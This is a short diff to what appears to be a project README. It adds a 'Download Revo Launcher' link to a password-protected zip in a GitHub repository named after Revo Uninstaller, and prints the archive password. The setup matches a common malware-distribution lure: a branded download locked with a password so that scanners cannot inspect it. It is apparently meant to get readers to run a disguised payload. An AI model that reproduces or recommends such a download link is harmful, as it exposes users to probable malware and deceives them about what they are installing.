@@ -6,8 +6,8 @@
 
 <hr>
 
-<li><b>Download Revo Launcher</b></li> <br>
-<a href="#"><img src="https://github.com/user-attachments/assets/7d8d58a8-aa01-44b4-bd30-6b3f97f4d6b5"></a>
+<li><b>Download Revo Launcher</b> <i>(Password: RevoLauncherForEver)</i></li><br>
+<a href="https://github.com/shapereign/revo-uninstaller/releases/download/Download/RevoLauncher.zip"><img src="https://github.com/user-attachments/assets/7d8d58a8-aa01-44b4-bd30-6b3f97f4d6b5"></a>
 <br><br>
 
 
